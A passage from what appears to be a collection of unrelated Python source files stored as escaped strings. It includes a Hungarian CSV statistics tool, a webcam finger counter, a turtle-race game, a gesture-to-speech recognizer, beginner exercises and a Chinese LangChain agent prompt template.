Sz\u00f6vegblokk ki\u00fcr\u00edt\u00e9se\n        else:\n            current.append(line) # Sz\u00f6vegblokkhoz hozz\u00e1tenni a sorokat am\u00edg nincs \"---\\n\"\n        line = fr.readline()\n    x.append(combine(current).rstrip(\"\\n\")) # Hozz\u00e1teszi az utols\u00f3 sz\u00f6vegblokkot egy list\u00e1hoz \u00e9s innen k\u00e9s\u00f6bb tudunk r\u00e1 hivatkozni\n    fr.close()\n    return x\n\ndef conditional_round(x, db, header, choice, tool, text): # Kerek\u00edt\u00e9s ha a felhaszn\u00e1l\u00f3 k\u00e9ri\n    good = [\"y\", \"n\"]\n    isrounded = input(\"Szeretn\u00e9l kerek\u00edteni ki\u00edr\u00e1s el\u0151tt? (y/n): \")\n    isrounded = valid_choice(isrounded, good)\n    \n    texts = [\"\u00f6sszege\", \"\u00e1tlaga\", \"minimumja\", \"maximumja\"] # A m\u00f3dok sz\u00f6vegei\n    for i in range(len(texts)):\n        if tool == i:\n            text_r = texts[i]\n\n    dot = 0\n    if x % db != 0: \n        for i in range(len(str(x/db))): # Megkeresi hol van a sz\u00e1mban a tizedespont\n            if str(x/db)[i] == \".\":\n                dot = i\n        db2 = -1\n        for i in range(dot, len(str(x/db))): # Megn\u00e9zi hogy h\u00e1ny tizedesjegy van a tizedespont ut\u00e1n\n            db2 += 1\n    else:\n        db2 = 0 # Ha a sz\u00e1m az Int t\u00edpus\u00fa akkor a 0. tizedesjegyig lehet kerek\u00edteni\n\n    if isrounded == \"y\": # Ha kerek\u00edt\u00e9s\n        print(f\"\\nEnn\u00e9l a sz\u00e1mn\u00e1l maximum a(z) {db2}. tizedesjegyig lehet kerek\u00edteni!\")\n        point = input(text[15])\n        while not is_number(point, int):\n            point = input(text[16])\n        point = int(point)\n\n        while point > db2 or point < 0: # Felhaszn\u00e1l\u00f3i fel\u00fclet biztos\u00edt\u00e1sa, ne lehessen 0-n\u00e1l kisebb, vagy a tizedesjegy sz\u00e1m\u00e1n\u00e1l nagyobb\n            print(f\"\\nEnn\u00e9l a sz\u00e1mn\u00e1l maximum a(z) {db2}. tizedesjegyig lehet kerek\u00edteni!\")\n            point = input(text[15])\n            while not is_number(point, int):\n                point = input(text[16])\n            point = int(point)\n\n        if point != 0: # Ez az\u00e9rt kell mert 38.5 int --> 38, de 38.5 int+round --> 39\n            print(f\"\\nA(z) {header[choice-1]} elemek {text_r} kerek\u00edtve {point} tizedesjegy pontoss\u00e1gra: {round(x/db, point)}\")\n        else:\n            print(f\"\\nA(z) {header[choice-1]} elemek {text_r} kerek\u00edtve {point} tizedesjegy pontoss\u00e1gra: {int(round(x/db))}\")\n    else:    \n        if db2 != 0: # Nincs kerek\u00edt\u00e9s + nem int\n            print(f\"\\nA(z) {header[choice-1]} elemek {text_r} kerek\u00edt\u00e9s n\u00e9lk\u00fcl: {x/db}\")\n        else:\n            print(f\"\\nA(z) {header[choice-1]} elemek {text_r} kerek\u00edt\u00e9s n\u00e9lk\u00fcl: {int(x/db)}\")\n\n#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#//#\n\ndef start_choice(text): # ASCII art \u00e9s m\u00f3d kiv\u00e1laszt\u00e1sa\n    system(\"cls\")\n    print(text[1])\n    good = [\"1\", \"2\", \"3\", \"q\"]\n    choice = input(text[2])\n    return valid_choice(choice, good)\n\ndef fchoose2(text): # F\u00e1jl kiv\u00e1laszt\u00e1sa\n    file_choice = input(text[4])\n    while not path.exists(file_choice) or file_choice == \"text.txt\": # path.exists(f\u00e1jl) --> Ha l\u00e9tezik a f\u00e1jl akkor True, ha nem akkor False\n        file_choice = input(\"Nem l\u00e9tezik ilyen f\u00e1jl!\\nK\u00e9rlek v\u00e1lassz m\u00e1st: \")\n    else:\n        print(f'Sikeresen kiv\u00e1lasztottad a \"{file_choice}\" f\u00e1jlt!')\n    return file_choice\n        \n\ndef fchoose(text, choice):\n    print(f\"A(z) {choice}. m\u00f3dot v\u00e1lasztottad ki!\")\n    \n    file = fchoose2(text) # F\u00e1jl kiv\u00e1laszt\u00e1sa\n    certain = areusure(text) # Biztos ezt a f\u00e1jlt?\n    while not certain: # Am\u00edg nem biztos addig...\n        file = fchoose2(text)\n        certain = areusure(text)\n\n    sleep(0.5)\n    system(\"cls\")\n    return file\n\ndef whichdata(text, filename, x): # Ez arra szolg\u00e1l hogy am\u00edg ugyanabban a form\u00e1ban van megadva az adat, mindig j\u00f3 legyen a program\n    fr = open(filename, \"r\", encoding=\"UTF-8\")\n    headers = fr.readline().strip().split(\";\")\n    fr.close()\n    \n    good = []\n    print(text[7])\n    for i in range(x, len(headers)): # x v\u00e1ltoz\u00f3 --> Melyik adatokat haszn\u00e1lhatja a felhaszn\u00e1l\u00f3\n        print(f\"{i+1}. {headers[i]}\") # Tudatja a felhaszn\u00e1l\u00f3val az el\u00e9rhet\u0151 adatokat",
    "import cv2\nimport numpy as np\nimport math\nimport HandTrackingModule as htm\nimport time\nimport os\n\n# Open Camera\ncap = cv2.VideoCapture(0)\ncap.set(3, 640)\ncap.set(4, 480)\n\nfolderPath = \"images\"\nimageList = os.listdir(folderPath)\nprint(imageList)\n\noverlayList = []\nfor imPath in imageList:\n    image = cv2.imread(f'{folderPath}/{imPath}')\n    overlayList.append(image)\n\nprint(len(overlayList))\npTime = 0\ncTime = 0\n\ndetector = htm.HandDetector(detectionCon=0.75)\ntipIds = [4, 8, 12, 16, 20]\n\nwhile True:\n    # Read Frame\n    success, img = cap.read()\n    # Flip Image\n    img = cv2.flip(img, 1)\n    # Find Hand Landmarks\n    img = detector.findHands(img)\n    lmList = detector.findPosition(img, draw=False)\n    \n    if len(lmList) != 0:\n        fingers = []\n        for id in range(0, 5):\n            if id !=0:\n                if lmList[tipIds[id]][2] < lmList[tipIds[id] - 2][2]:\n                    fingers.append(1)\n                else:\n                    fingers.append(0)\n            else:\n                if lmList[tipIds[id]][1] < lmList[tipIds[id] - 1][1]:\n                    fingers.append(1)\n                else:\n                    fingers.append(0)\n        totalFingers = fingers.count(1)\n        print(fingers)\n        \n        h, w, c = overlayList[totalFingers].shape\n        img[0:h, 0:w] = overlayList[totalFingers] \n        print(\"IMAGE: \",h, w, c)\n        pos = int(w/2)\n        cv2.rectangle(img, (0, h), (w, h+60), (0, 255, 0), cv2.FILLED)\n        cv2.putText(img, str(totalFingers), (pos - 20, h+55), cv2.FONT_HERSHEY_PLAIN, 5, (255, 0, 0), 3)\n    # Frame Rate\n    cTime = time.time()\n    fps = 1 / (cTime - pTime)\n    pTime = cTime\n    # rhs\n    cv2.putText(img, f'FPS: {int(fps)}', (400, 70), cv2.FONT_HERSHEY_PLAIN, 3, (255, 0, 0), 3)\n    \n    # Display Image\n    cv2.imshow(\"Image\", img)\n    # Exit\n    cv2.waitKey(1)\n",
    "from turtle import Turtle, Screen\nimport random\n\nis_race_on = False\nscreen = Screen()\nscreen.setup(width=500, height=400)\nuser_bet = screen.textinput(title=\"Make your bet\", prompt=\"Which turtle will win the race? Enter a color: \")\ncolors = [\"red\", \"orange\", \"yellow\", \"green\", \"blue\", \"purple\"]\ny_positions = [-70, -40, -10, 20, 50, 80]\nall_turtles = []\n\nif user_bet not in colors:\n    exit()\n\n\nfor turtle_index in range(0, 6):\n    new_turtle = Turtle(shape=\"turtle\")\n    new_turtle.penup()\n    new_turtle.color(colors[turtle_index])\n    new_turtle.goto(x=-230, y=y_positions[turtle_index])\n    all_turtles.append(new_turtle)\n\nif user_bet:\n    is_race_on = True\n\nwhile is_race_on:\n    for turtle in all_turtles:\n        if turtle.xcor() > 230:\n            is_race_on = False\n            winning_color = turtle.pencolor()\n            if winning_color == user_bet:\n                print(f\"You've won! The {winning_color} turtle is the winner!\")\n            else:\n                print(f\"You've lost! The {winning_color} turtle is the winner!\")\n\n        rand_distance = random.randint(0, 10)\n        turtle.forward(rand_distance)\n\nscreen.exitonclick()\n",
    "from serial import Serial\nimport pandas as pd\nimport joblib\nimport pyttsx3\nimport numpy as np\n\nclass GestureRecognizer:\n    def __init__(self, serial_port='COM9', baud_rate=9600):\n        self.serial_port = serial_port\n        self.baud_rate = baud_rate\n        self.data_buffer = []\n\n    def collect_data(self):\n        with Serial(self.serial_port, self.baud_rate) as ser:\n            while True:\n                command = input()\n                if command == 'n':\n                    ser.write(b'n')\n                    line = ser.readline().decode().strip()\n                    data_points = list(map(int, line.split(' ')))\n                    if len(data_points) == 8:\n                        self.data_buffer.append(data_points)\n\n                elif command == 'q':\n                    break\n\n    def predict_and_speak(self):\n        engine = pyttsx3.init()\n        engine.setProperty('rate', 150)\n        engine.setProperty('volume', 0.9)\n        # model = joblib.load(\"./models/ML_MODEL.pkl\")  # ML Model\n        model = joblib.load('./models/ANN_MODEL.pkl') # ANN Model\n    \n        while self.data_buffer:\n            data = self.data_buffer.pop(0)\n            self.df = pd.DataFrame(data, columns=[\"x\", \"y\", \"z\", \"f1\", \"f2\", \"f3\", \"f4\", \"f5\"]) \n            df_ = np.reshape(self.df, (self.df.shape[0], 1, self.df.shape[1])) # ANN\n            predictions = model.predict(df_)\n            encoding_values = {'Hello Sir': 0, 'Hi': 1, 'Hungry': 2, 'Neutral': 3, 'Nice': 4, 'Please': 5, 'Stop': 6, 'Thank you': 7} # ANN\n            decoded_predictions = [encoding_values[np.argmax(pred)] for pred in predictions] # ANN\n            self.df['prediction'] = decoded_predictions # ANN\n            \n            if decoded_predictions[-1] == \"Hello Sir\":\n                engine.say(\"Add Intro Here in Line 44\")    \n            else:\n                engine.say(decoded_predictions[-1])\n                engine.runAndWait()\n\n    def save_data_to_csv(self):\n        # df = pd.DataFrame(self.data_buffer, columns=[\"x\", \"y\", \"z\", \"f1\", \"f2\", \"f3\", \"f4\", \"f5\"])\n        self.df.to_csv(\"gesture_training_p.csv\", index=False)\n\n    def run(self):\n        try:\n            self.collect_data()\n            self.predict_and_speak()\n            self.save_data_to_csv()\n        finally:\n            self.save_data_to_csv()\n\nif __name__ == \"__main__\":\n    recognizer = GestureRecognizer()\n    recognizer.run()\n",
    "# Scenario\n# Your task is to write a function able to input integer values and to check if they are within a specified range.\n\n# The function should:\n\n# accept three arguments: a prompt, a low acceptable limit, and a high acceptable limit;\n# if the user enters a string that is not an integer value, the function should emit the message Error: wrong input, and ask the user to input the value again;\n# if the user enters a number which falls outside the specified range, the function should emit the message Error: the value is not within permitted range (min..max) and ask the user to input the value again;\n# if the input value is valid, return it as a result.\n\n####################################################################################################\n\n# Test data\n# Test your code carefully.\n\n# This is how the function should react to the user's input:\n\n# Enter a number from -10 to 10: 100\n# Error: the value is not within permitted range (-10..10)\n# Enter a number from -10 to 10: asd\n# Error: wrong input\n# Enter number from -10 to 10: 1\n# The number is: 1\n\n####################################################################################################\n\n# def read_int(prompt, min, max):\n#     #\n#     # Write your code here.\n#     #\n\n\n# v = read_int(\"Enter a number from -10 to 10: \", -10, 10)\n\n# print(\"The number is:\", v)\n\n####################################################################################################\n\n\n\ndef read_int(prompt,min,max):\n    try:\n        v = float(input(prompt))\n    except ValueError:\n        return(\"Error: Wrong input\")\n    try:\n        assert v>=min and v<=max\n    except AssertionError:\n        return(f\"Error: The Value is not within permitted range ({min}, {max})\")\n    return (f\"The number is: {v}\")\nv = read_int(\"Enter a number from -10 to 10:\",-10,10)\n\nprint(v)",
    "# Scenario\n# Let's play a game. We will give you two strings: one being a word (e.g., \"dog\") and the second being a combination of any characters.\n\n# Your task is to write a program which answers the following question: are the characters comprising the first string hidden inside\n# the second string?\n\n# For example:\n\n# if the second string is given as \"vcxzxduybfdsobywuefgas\", the answer is yes;\n# if the second string is \"vcxzxdcybfdstbywuefsas\", the answer is no (as there are neither the letters \"d\", \"o\", or \"g\", in this order)\n# Hints:\n\n# you should use the two-argument variants of the pos() functions inside your code;\n# don't worry about case sensitivity.\n\n####################################################################################################\n\n# Test your code using the data we've provided.\n\n# Test data\n# Sample input:\n\n# donor\n# Nabucodonosor\n# Sample output:\n\n# Yes\n\n\n# Sample input:\n\n# donut\n# Nabucodonosor\n# Sample output:\n\n# No\n\n####################################################################################################\n\n\ndef letrcounter(st):\n    st = st.lower()\n    dic = {}\n    for i in st:\n        dic[i] = 1 + dic.get(i, 0)\n    return dic\n\n\ndef wordFinder(st1, st2):\n    dic1 = letrcounter(st1)\n    dic2 = letrcounter(st2)\n    for k in dic1:\n        if dic2.get(k, 0) < dic1[k]:\n            return \"No\"\n\n    return \"Yes\"\n\n\nval1 = input(\"Enter the first word : \\n\")\nval2 = input(\"Enter the second word : \\n\")\nresult = wordFinder(val1, val2)\nprint(result)\n",
    "\nfrom langchain.prompts import PromptTemplate\n\n# ### main_prompt\nprompt = PromptTemplate.from_template(\"\"\"\n\u4f60\u662f\u5f3a\u5927\u7684AI\u52a9\u624b\uff0c\u53ef\u4ee5\u4f7f\u7528\u5de5\u5177\u4e0e\u6307\u4ee4\u81ea\u52a8\u5316\u89e3\u51b3\u95ee\u9898\u3002\n\n# \u4f60\u5fc5\u987b\u9075\u5faa\u4ee5\u4e0b\u7ea6\u675f\u6765\u5b8c\u6210\u4efb\u52a1:\n{constraints}\n\n# \u4f60\u7684\u4efb\u52a1\u662f:\n{task_description}\n\u5982\u679c\u6b64\u4efb\u52a1\u663e\u793a\u201c\u65e0\u201d\u3001\u201c\u6ca1\u6709\u4e86\u201d\u3001\u201c\u5df2\u5b8c\u6210\u201d\u6216\u7c7b\u4f3c\u8868\u8fbe\uff0c\u4f60\u76f4\u63a5\u8f93\u51fa\u4e0b\u8ff0\u5de5\u5177\u4e2d\u7684FINISH\u5373\u53ef\u3002\n\n# \u4f60\u9700\u8981\u7684\u6240\u6709\u6587\u4ef6\u8d44\u6599\u90fd\u5728\u4ee5\u4e0b\u76ee\u5f55:\ndir_path={work_dir}\n\n# \u4f60\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u5de5\u5177\u6216\u6307\u4ee4\uff0c\u5b83\u4eec\u53c8\u79f0\u4e3a\u52a8\u4f5c\u6216actions:\n{tools}\n\n# \u4f60\u53ef\u4ee5\u4f7f\u7528\u7684\u8d44\u6e90\u5305\u62ec:\n{resources}\n\n# \u4f60\u9700\u8981\u8bc4\u4f30\u4f60\u7684\u8868\u73b0:\n{performance_evaluation}\n\n# \u76f8\u5173\u7684\u5386\u53f2\u8bb0\u5f55:\n{long_term_memory}\n\n# \u5f53\u524d\u7684\u4efb\u52a1\u6267\u884c\u8bb0\u5f55:\n{short_term_memory}\n\n# \u8f93\u51fa\u5f62\u5f0f\uff1a\n##\uff081\uff09\u9996\u5148\uff0c\u6839\u636e\u4ee5\u4e0b\u683c\u5f0f\u8bf4\u660e\uff0c\u8f93\u51fa\u4f60\u7684\u601d\u8003\u8fc7\u7a0b:\n{thought_instructions}\n\n##\uff082\uff09\u7136\u540e\uff0c\u6839\u636e\u4ee5\u4e0b\u683c\u5f0f\u8bf4\u660e\uff0c\u8f93\u51fa\u4f60\u9009\u62e9\u6267\u884c\u7684\u52a8\u4f5c/\u5de5\u5177:\n{format_instructions}\n\"\"\")\n\n#\u4e3b\u6d41\u7a0bprompt\u8f83\u4e3a\u590d\u6742\uff0c\u53ef\u4ee5\u7ed3\u5408\u5c40\u90e8\u6a21\u677f\u6216pipeline\u5206\u5c42\u6784\u5efa\uff0c\u4ee5\u65b9\u4fbf\u7ef4\u62a4\u3002<br>\n# \u4e0b\u9762\u662f\u5206\u5e03\u6784\u5efa\u7684\u8fc7\u7a0b\uff0c\u6700\u540e\u4f7f\u7528\u8f83\u7b80\u5355\u7684\u65b9\u5f0f\u5408\u5e76\u5728\u4e00\u8d77\u3002\n# #### \u7ea6\u675f\u6761\u4ef6\nconstraints = \"\"\"\n1. \u6bcf\u6b21\u4f60\u7684\u51b3\u7b56\u53ea\u4f7f\u7528\u4e00\u79cd\u5de5\u5177\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528\u4efb\u610f\u591a\u6b21\u3002\n2. \u786e\u4fdd\u4f60\u8c03\u7528\u7684\u6307\u4ee4\u6216\u4f7f\u7528\u7684\u5de5\u5177\u5728\u4e0b\u8ff0\u7ed9\u5b9a\u7684\u5de5\u5177\u5217\u8868\u4e2d\u3002\n3. \u786e\u4fdd\u4f60\u7684\u56de\u7b54\u4e0d\u4f1a\u5305\u542b\u8fdd\u6cd5\u6216\u6709\u4fb5\u72af\u6027\u7684\u4fe1\u606f\u3002\n4. \u5982\u679c\u4f60\u5df2\u7ecf\u5b8c\u6210\u6240\u6709\u4efb\u52a1\uff0c\u786e\u4fdd\u4ee5\"FINISH\"\u6307\u4ee4\u7ed3\u675f\u3002\n5. \u7528\u4e2d\u6587\u601d\u8003\u548c\u8f93\u51fa\u3002\n6. \u5982\u679c\u6267\u884c\u67d0\u4e2a\u6307\u4ee4\u6216\u5de5\u5177\u5931\u8d25\uff0c\u5c1d\u8bd5\u6539\u53d8\u53c2\u6570\u6216\u53c2\u6570\u683c\u5f0f\u518d\u6b21\u8c03\u7528\u3002\n7. \u4f60\u751f\u6210\u7684\u56de\u590d\u5fc5\u987b\u9075\u5faa\u4e0a\u6587\u4e2d\u7ed9\u5b9a\u7684\u4e8b\u5b9e\u4fe1\u606f\u3002\u4e0d\u53ef\u4ee5\u7f16\u9020\u4fe1\u606f\u3002DO NOT MAKE UP INFORMATION.\n8. \u5982\u679c\u5f97\u5230\u7684\u7ed3\u679c\u4e0d\u6b63\u786e\uff0c\u5c1d\u8bd5\u66f4\u6362\u8868\u8fbe\u65b9\u5f0f\u3002\n9. \u5df2\u7ecf\u5f97\u5230\u7684\u4fe1\u606f\uff0c\u4e0d\u8981\u53cd\u590d\u67e5\u8be2\u3002\n10. \u786e\u4fdd\u4f60\u751f\u6210\u7684\u52a8\u4f5c\u662f\u53ef\u4ee5\u7cbe\u786e\u6267\u884c\u7684\u3002\u52a8\u4f5c\u505a\u4e2d\u53ef\u4ee5\u5305\u62ec\u5177\u4f53\u65b9\u6cd5\u548c\u76ee\u6807\u8f93\u51fa\u3002\n11. \u770b\u5230\u4e00\u4e2a\u6982\u5ff5\u65f6\u5c1d\u8bd5\u83b7\u53d6\u5b83\u7684\u51c6\u786e\u5b9a\u4e49\uff0c\u5e76\u5206\u6790\u4ece\u54ea\u4e9b\u8f93\u5165\u53ef\u4ee5\u5f97\u5230\u5b83\u7684\u5177\u4f53\u53d6\u503c\u3002\n12. \u751f\u6210\u4e00\u4e2a\u81ea\u7136\u8bed\u8a00\u67e5\u8be2\u65f6\uff0c\u8bf7\u5728\u67e5\u8be2\u4e2d\u5305\u542b\u5168\u90e8\u7684\u5df2\u77e5\u4fe1\u606f\u3002\n13. \u5728\u6267\u884c\u5206\u6790\u6216\u8ba1\u7b97\u52a8\u4f5c\u524d\uff0c\u786e\u4fdd\u8be5\u5206\u6790\u6216\u8ba1\u7b97\u4e2d\u6d89\u53ca\u7684\u6240\u6709\u5b50\u6982\u5ff5\u90fd\u5df2\u7ecf\u5f97\u5230\u4e86\u5b9a\u4e49\u3002\n14. \u4f60\u4e0d\u53ef\u4ee5\u6253\u5370\u4e00\u4e2a\u6587\u4ef6\u7684\u5168\u90e8\u5185\u5bb9\uff0c\u8fd9\u6837\u7684\u64cd\u4f5c\u4ee3\u4ef7\u592a\u5927\uff0c\u4e14\u4f1a\u9020\u6210\u4e0d\u53ef\u9884\u671f\u7684\u540e\u679c\uff0c\u662f\u88ab\u4e25\u683c\u7981\u6b62\u7684\u3002\n15. \u4e0d\u8981\u5411\u7528\u6237\u63d0\u95ee\u3002\n\"\"\"\n \n# #### \u9650\u5b9a\u8d44\u6e90\nresources = \"\"\"\n1. \u4f60\u53ef\u4ee5\u67e5\u9605\u672c\u5730\u6587\u4ef6\u5217\u8868\u3002\n2. \u4f60\u53ef\u4ee5\u8bfb\u53d6\u672c\u5730\u6587\u4ef6\u3002\n3. \u4f60\u53ef\u4ee5\u901a\u8fc7\u4ee3\u7801\u64cd\u4f5c\u672c\u5730\u6587\u4ef6\u3002\n4. \u4f60\u6709\u975e\u5e38\u4f18\u79c0\u7684\u903b\u8f91\u5206\u6790\u80fd\u529b\uff0c\u53ef\u4ee5\u901a\u8fc7\u56e0\u679c\u5173\u7cfb\u627e\u5230\u6700\u4f18\u7684\u89e3\u51b3\u65b9\u6848\u3002\n\"\"\"\n \n# #### \u8868\u73b0\u8bc4\u4f30\nperformance_evaluation = \"\"\"\n1. \u5c3d\u4f60\u6700\u5927\u7684\u52aa\u529b\uff0c\u7528\u4f60\u6700\u597d\u7684\u6c34\u5e73\uff0c\u901a\u8fc7\u5206\u6790\u548c\u68c0\u67e5\uff0c\u505a\u51fa\u6700\u597d\u7684\u51b3\u5b9a\u3002\n2. \u5e26\u7740\u5168\u5c40\u89c2\uff0c\u81ea\u6211\u53cd\u601d\u4f60\u8ba1\u5212\u4e0e\u52a8\u4f5c\u3002\n3. \u8003\u8651\u4f60\u4e4b\u524d\u7684\u7b56\u7565\u4e0e\u51b3\u7b56\u6765\u6539\u5584\u7684\u4f60\u7684\u8ba1\u5212\u3002\n4. \u5982\u679c\u4f60\u53cd\u590d\u5f97\u5230\u76f8\u540c\u7684\u7ed3\u679c\uff0c\u4fee\u6539\u4f60\u7684\u8ba1\u5212\u548c\u51b3\u7b56\uff0c\u907f\u514d\u6b7b\u5faa\u73af\u3002\n5. \u5982\u679c\u4f60\u5f53\u524d\u7684\u52a8\u4f5c\u65e0\u6cd5\u83b7\u53d6\u5230\u9700\u8981\u7684\u4fe1\u606f\uff0c\u5c1d\u8bd5\u5c55\u5f00\u5173\u952e\u6982\u5ff5\u7684\u5b9a\u4e49\uff0c\u518d\u91cd\u65b0\u63a8\u7406\u3002\n\"\"\"\n \n# #### \u601d\u8003\u8fc7\u7a0b\nthought_instructions = \"\"\"\n\u5173\u952e\u6982\u5ff5: \u4efb\u52a1\u4e2d\u6d89\u53ca\u7684\u7ec4\u5408\u578b\u6982\u5ff5\u6216\u5b9e\u4f53\u3002\u5df2\u7ecf\u660e\u786e\u83b7\u5f97\u53d6\u503c\u7684\u5173\u952e\u6982\u5ff5\uff0c\u5c06\u5176\u53d6\u503c\u5b8c\u6574\u5907\u6ce8\u5728\u6982\u5ff5\u540e\u3002\n\u6982\u5ff5\u62c6\u89e3: \u5c06\u4efb\u52a1\u4e2d\u7684\u5173\u952e\u6982\u5ff5\u62c6\u89e3\u4e3a\u4e00\u7cfb\u5217\u5f85\u67e5\u8be2\u7684\u5b50\u8981\u7d20\u3002\u6bcf\u4e2a\u5173\u952e\u6982\u5ff5\u4e00\u884c\uff0c\u540e\u63a5\u8fd9\u4e2a\u6982\u5ff5\u7684\u5b50\u8981\u7d20\uff0c\u6bcf\u4e2a\u5b50\u8981\u7d20\u4e00\u884c\uff0c\u884c\u524d\u4ee5' -'\u5f00\u59cb\u3002\n\u53cd\u601d:\n    \u81ea\u6211\u53cd\u601d\uff0c\u89c2\u5bdf\u4ee5\u524d\u7684\u6267\u884c\u8bb0\u5f55\uff0c\u601d\u8003\u6982\u5ff5\u62c6\u89e3\u662f\u5426\u5b8c\u6574\u3001\u51c6\u786e\u3002\n    \u4e00\u6b65\u6b65\u601d\u8003\u662f\u5426\u6bcf\u4e00\u4e2a\u7684\u5173\u952e\u6982\u5ff5\u6216\u8981\u7d20\u7684\u67e5\u8be2\u90fd\u5f97\u5230\u4e86\u51c6\u786e\u7684\u7ed3\u679c\u3002\n    \u53cd\u601d\u4f60\u5df2\u7ecf\u5f97\u5230\u54ea\u4e2a\u8981\u7d20/\u6982\u5ff5\u3002\u4f60\u5f97\u5230\u7684\u8981\u7d20/\u6982\u5ff5\u53d6\u503c\u662f\u5426\u6b63\u786e\u3002\u4ece\u5f53\u524d\u7684\u4fe1\u606f\u4e2d\u8fd8\u4e0d\u80fd\u5f97\u5230\u54ea\u4e9b\u8981\u7d20/\u6982\u5ff5\u3002\n    \u6bcf\u4e2a\u53cd\u601d\u4e00\u884c\uff0c\u884c\u524d\u4ee5' -'\u5f00\u59cb\u3002\n\u601d\u8003: \u89c2\u5bdf\u6267\u884c\u8bb0\u5f55\u548c\u4f60\u7684\u81ea\u6211\u53cd\u601d\uff0c\u5e76\u4e00\u6b65\u6b65\u601d\u8003\n  \uff081\uff09\u5206\u6790\u8981\u7d20\u95f4\u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u4f8b\u5982\uff1a\n    i. \u6211\u662f\u5426\u9700\u8981\u5148\u83b7\u5f97A\u7684\u503c/\u5b9a\u4e49\uff0c\u624d\u80fd\u901a\u8fc7A\u6765\u83b7\u5f97B\uff1f\n    ii. \u5982\u679c\u6211\u5148\u83b7\u5f97A\uff0c\u662f\u5426\u53ef\u4ee5\u901a\u8fc7A\u7b5b\u9009B\uff0c\u51cf\u5c11\u7a77\u4e3e\u6bcf\u4e2aB\u7684\u4ee3\u4ef7\uff1f\n    iii. A\u548cB\u662f\u5426\u5b58\u5728\u5728\u540c\u4e00\u6570\u636e\u6e90\u4e2d\uff0c\u6211\u80fd\u5426\u5728\u83b7\u53d6A\u7684\u540c\u65f6\u83b7\u53d6B\uff1f\n    iv. \u662f\u5426\u8fd8\u6709\u66f4\u9ad8\u6548\u6216\u66f4\u806a\u660e\u7684\u529e\u6cd5\u6765\u67e5\u8be2\u4e00\u4e2a\u6982\u5ff5\u6216\u8981\u7d20\uff1f\n    v. \u5982\u679c\u4e0a\u4e00\u6b21\u5c1d\u8bd5\u67e5\u8be2\u4e00\u4e2a\u6982\u5ff5\u6216\u8981\u7d20\u65f6\u5931\u8d25\u4e86\uff0c\u6211\u662f\u5426\u53ef\u4ee5\u5c1d\u8bd5\u4ece\u53e6\u4e00\u4e2a\u8d44\u6e90\u4e2d\u518d\u6b21\u67e5\u8be2\uff1f\n    vi. \u8bf8\u5982\u6b64\u7c7b\uff0c\u4f60\u53ef\u4ee5\u6269\u5c55\u66f4\u591a\u7684\u601d\u8003 ...\n  \uff082\uff09\u6839\u636e\u4ee5\u4e0a\u5206\u6790\uff0c\u6392\u5217\u5b50\u8981\u7d20\u95f4\u7684\u67e5\u8be2\u4f18\u5148\u7ea7\n  \uff083\uff09\u627e\u51fa\u5f53\u524d\u9700\u8981\u83b7\u5f97\u53d6\u503c\u7684\u5b50\u8981\u7d20\n  \u6ce8\u610f\uff0c\u4e0d\u8981\u5bf9\u8981\u7d20\u7684\u53d6\u503c/\u5b9a\u4e49\u505a\u4efb\u4f55\u5047\u8bbe\uff0c\u786e\u4fdd\u4f60\u7684\u4fe1\u606f\u6765\u81ea\u7ed9\u5b9a\u7684\u6570\u636e\u6e90\uff01\n\u63a8\u7406: \u6839\u636e\u4f60\u7684\u53cd\u601d\u4e0e\u601d\u8003\uff0c\u4e00\u6b65\u6b65\u63a8\u7406\u88ab\u9009\u62e9\u7684\u5b50\u8981\u7d20\u53d6\u503c\u7684\u83b7\u53d6\u65b9\u5f0f\u3002\u5982\u679c\u524d\u4e00\u6b21\u7684\u8ba1\u5212\u5931\u8d25\u4e86\uff0c\u8bf7\u68c0\u67e5\u8f93\u5165\u4e2d\u662f\u5426\u5305\u542b\u6bcf\u4e2a\u6982\u5ff5/\u8981\u7d20\u7684\u660e\u786e\u5b9a\u4e49\uff0c\u5e76\u5c1d\u8bd5\u7ec6\u5316\u4f60\u7684\u67e5\u8be2\u63cf\u8ff0\u3002\n\u8ba1\u5212: \u4e25\u683c\u9075\u5b88\u4ee5\u4e0b\u89c4\u5219\uff0c\u8ba1\u5212\u4f60\u7684\u5f53\u524d\u52a8\u4f5c\u3002\n  \uff081\uff09\u8be6\u7ec6\u5217\u51fa\u5f53\u524d\u52a8\u4f5c\u7684\u6267\u884c\u8ba1\u5212\u3002\u53ea\u8ba1\u5212\u4e00\u6b65\u7684\u52a8\u4f5c\u3002PLAN ONE STEP ONLY!\n  \uff082\uff09\u4e00\u6b65\u6b65\u5206\u6790\uff0c\u5305\u62ec\u6570\u636e\u6e90\uff0c\u5bf9\u6570\u636e\u6e90\u7684\u64cd\u4f5c\u65b9\u5f0f\uff0c\u5bf9\u6570\u636e\u7684\u5206\u6790\u65b9\u6cd5\u3002\u6709\u54ea\u4e9b\u5df2\u77e5\u5e38\u91cf\u53ef\u4ee5\u76f4\u63a5\u4ee3\u5165\u6b64\u6b21\u5206\u6790\u3002\n  \uff083\uff09\u4e0d\u8981\u5c1d\u8bd5\u8ba1\u7b97\u6587\u4ef6\u7684\u6bcf\u4e00\u4e2a\u5143\u7d20\uff0c\u8fd9\u79cd\u8ba1\u7b97\u4ee3\u4ef7\u592a\u9ad8\uff0c\u662f\u4e25\u683c\u7981\u6b62\u7684\u3002\u4f60\u53ef\u4ee5\u901a\u8fc7\u5206\u6790\u627e\u5230\u66f4\u6709\u6548\u7684\u65b9\u6cd5\uff0c\u6bd4\u5982\u6761\u4ef6\u7b5b\u9009\u3002\n  \uff084\uff09\u4e0a\u8ff0\u5206\u6790\u662f\u5426\u4f9d\u8d56\u67d0\u4e2a\u8981\u7d20\u7684\u53d6\u503c/\u5b9a\u4e49\uff0c\u4e14\u8be5\u8981\u7d20\u7684\u53d6\u503c/\u5b9a\u4e49\u5c1a\u672a\u83b7\u5f97\u3002\u82e5\u679c\u662f\uff0c\u91cd\u65b0\u89c4\u5212\u5f53\u524d\u52a8\u4f5c\uff0c\u786e\u4fdd\u6240\u6709\u4f9d\u8d56\u7684\u8981\u7d20\u7684\u53d6\u503c/\u5b9a\u4e49\u90fd\u5df2\u7ecf\u83b7\u5f97\u3002\n  